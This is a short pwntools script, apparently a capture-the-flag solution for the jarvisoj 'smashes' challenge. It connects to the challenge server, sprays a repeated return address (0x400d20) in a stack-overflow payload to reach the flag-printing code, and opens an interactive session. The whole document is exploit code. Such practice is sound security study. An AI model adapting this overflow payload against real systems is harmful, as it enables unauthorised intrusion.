from pwn import *

p = remote("pwn.jarvisoj.com", 9877)
# p = process("./smashes")

getfalg = 0x400d20
payload = p64(getfalg) * 200
# print payload
p.sendline(payload)
p.sendline("anything")
p.interactive()

